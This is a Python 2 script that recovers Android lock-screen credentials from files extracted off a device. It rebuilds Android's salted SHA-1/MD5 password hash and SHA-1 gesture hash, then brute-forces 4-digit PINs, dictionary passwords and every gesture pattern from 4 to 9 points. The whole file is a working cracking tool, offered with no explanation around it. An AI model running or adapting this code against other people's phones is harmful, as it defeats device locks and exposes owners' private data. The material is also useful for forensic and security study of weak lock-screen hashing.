import hashlib, struct, sqlite3, binascii, sys, os
import itertools
from string import ascii_letters

# Interesting files in AOSP: 
# mydroid/libcore/luni/src/main/java/java/lang/Long.java
# mydroid/frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java
#
# Interesting files on-device:
# /data/data/com.android.providers.settings/databases/settings.db
# /data/system/password.key
# /data/system/gesture.key

DIR='out/'
dbname = DIR+'settings.db'
keyname = DIR+'password.key'
gesturename = DIR+'gesture.key'


numbers = [str(c) for c in range(10)]
alphabet_and_numbers = [c for c in ascii_letters] + numbers
numbers2 = ['\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08'] #0 to 8 in bytes values

#empiric values
PASSWORD_TYPE_PINCODE="131072"
PASSWORD_TYPE_PASSWORD="262144"

#python implementation of LockPatternUtils.java > getSalt()
def get_salt(dbname):
  conn = sqlite3.connect(dbname)

  c = conn.cursor()
  c.execute('''select value from secure where name=?''', ("lockscreen.password_type",))
  type1 = c.fetchone()[0]
  if type1 != PASSWORD_TYPE_PINCODE and type1 != PASSWORD_TYPE_PASSWORD:
    print "Not password protected, unsupported for now."
    return None
  
  c.execute('''select value from secure where name=?''', ("lockscreen.password_salt",))

  salt = long(c.fetchone()[0]) #long, eg: -2763352342540573722L

  conn.close()
  return (type1, binascii.b2a_hex(struct.pack('>q', salt)))

#python implementation of LockPatternUtils.java > passwordToHash()
def password_to_hash(password):
  (type1, salt) = get_salt(dbname)
  salted_password = password + salt
  hashed = hashlib.sha1(salted_password).hexdigest() + hashlib.md5(salted_password).hexdigest()
  return hashed

#python implementation of LockPatternUtils.java > checkPassword()
def check_password(password):
  f = open(keyname)
  stored = f.read() #something like 0595FEAE68FF4AC939BA0E93ADF3C6EE94E2DADD67D3FB2306419E7F4B4B3BE37E3F40F9 for password = 1337
  f.close()
  return stored.lower() == password_to_hash(password)

def do_once():
  if len(sys.argv) != 2:
    print "Usage: %s <password>" % sys.argv[0]
    sys.exit(0)

  if check_password(sys.argv[1]):
    print "Successfully found!"
  else:
    print "Wrong password!"

alphabet = ['']

# My implementation to bruteforce the passcode with 4 characters
def bruteforce_pincode(alphabet, length):
  print "Starting bruteforce of the pincode with %d characters..." % length
  
  #do it once for all to accelerate it. See check_password for that
  f = open(keyname)
  stored = f.read().lower()
  f.close()

  #actual bruteforce loop
  tests = itertools.product(alphabet, repeat=length)
  for t in tests:
    if password_to_hash("".join(t)) == stored:
      print "Found password: %s" % "".join(t)
      return True
  print "No password found!"
  return False

# Works for pincode and passwords because same implementation
def bruteforce_dict(dictionary_file="dict.txt"):
  print "Starting bruteforce with %s..." % dictionary_file

  #do it once for all to accelerate it. See check_password for that
  f = open(keyname)
  stored = f.read().lower()
  f.close()

  #actual bruteforce loop
  f = open(dictionary_file, 'r')
  for t in f:
    if password_to_hash(t[:-1]) == stored: #-1 to remove \n
      print "Found password: %s" % "".join(t)
      return True
  print "No password found!"
  return False

def gesture2display(t):
  s=""
  for i in t:
    s += "%d" % ord(i)
  return s

# Works for gesture which has a different but still simple implementation
# We do it in an easy way that could be improved in speed but still it takes only a few seconds to process so good enough
#TODO: to make it better, we could first avoid repetitions by removing 0 to 4 elements from the original list, and even
#      better, we could take into account the fact that only adjacents numbers could be selected? But not needed :)
def bruteforce_gesture():
  print "Starting gesture bruteforce..."
  if not bruteforce_gesture_4to7pts():
    if not bruteforce_gesture_8pts():
      if not bruteforce_gesture_9pts():
        print "No password found!"
        return False
  return True

def printgesture():
  print "0 1 2"
  print "3 4 5"
  print "6 7 8"

def bruteforce_gesture_4to7pts():

  #do it once for all to accelerate it. See check_password for that
  f = open(gesturename, 'rb')
  stored = f.read() #do not do lowercase here, /!\
  f.close()

  #actual bruteforce loop
  #for i in range(4,11): #too long
  for i in range(4,8):
    print "Testing with %d points..." % i
    tests = itertools.product(numbers2, repeat=i)
    for t in tests:
      if hashlib.sha1("".join(t)).hexdigest() == binascii.hexlify(stored):
        print "Found gesture: %s" % gesture2display(t)
        printgesture()
        return True
  return False

def bruteforce_gesture_9pts():

  #do it once for all to accelerate it. See check_password for that
  f = open(gesturename, 'rb')
  stored = f.read() #do not do lowercase here, /!\
  f.close()

  #actual bruteforce loop
  print "Testing with 9 points..."
  tests = itertools.permutations(numbers2)
  for t in tests:
    if hashlib.sha1("".join(t)).hexdigest() == binascii.hexlify(stored):
      print "Found gesture: %s" % gesture2display(t)
      printgesture()
      return True
  return False

def bruteforce_gesture_8pts():

  #do it once for all to accelerate it. See check_password for that
  f = open(gesturename, 'rb')
  stored = f.read() #do not do lowercase here, /!\
  f.close()

  #actual bruteforce loop
  print "Testing with 8 points..."
  for i in range(len(numbers2)):
    print "Without %d..." % i
    numbers22 = numbers2[:i] + numbers2[i+1:]
    tests = itertools.permutations(numbers22)
    for t in tests:
      if hashlib.sha1("".join(t)).hexdigest() == binascii.hexlify(stored):
        print "Found gesture: %s" % gesture2display(t)
        printgesture()
        return True
  return False

def bruteforce_all():
  res = None
  if os.path.exists(gesturename):
    res = bruteforce_gesture()
  if not res and os.path.exists(keyname):
    res = bruteforce_pincode(numbers, 4)
  if not res:
    bruteforce_dict()


if __name__ == '__main__':
  #do_once()
  #bruteforce_pincode(numbers, 4)
  #bruteforce_dict()
  #bruteforce_gesture()
  bruteforce_all()
